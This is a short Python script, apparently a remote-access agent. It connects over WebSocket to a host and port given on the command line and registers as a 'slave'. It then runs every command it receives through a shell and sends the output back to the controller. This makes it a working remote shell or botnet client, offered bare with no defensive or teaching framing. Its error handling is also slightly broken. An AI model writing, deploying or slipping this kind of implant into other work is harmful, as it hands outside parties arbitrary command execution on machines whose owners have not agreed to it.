from websocket import create_connection
import time
import json
import subprocess
import requests
import threading
import sys

ip = sys.argv[1]
port = sys.argv[2]
ws = create_connection("ws://"+ip+":"+port)


def send(data):
    global ws
    ws.send(json.dumps(data))
    return


def receive():
    while True:
        global ws
        data = ws.recv()
        result = json.loads(data)
        print(result)
        if 'command' in result:
            executerThread = threading.Thread(target=execute, args=(result['command'],))
            executerThread.start()


def execute(command):
    try:
        result = subprocess.check_output(command, shell=True).decode("utf-8", "ignore")
    except:
        pass
    print(result)
    send({'result': result})


send({'role': 'slave'})

receiverThread = threading.Thread(target=receive)
receiverThread.start()
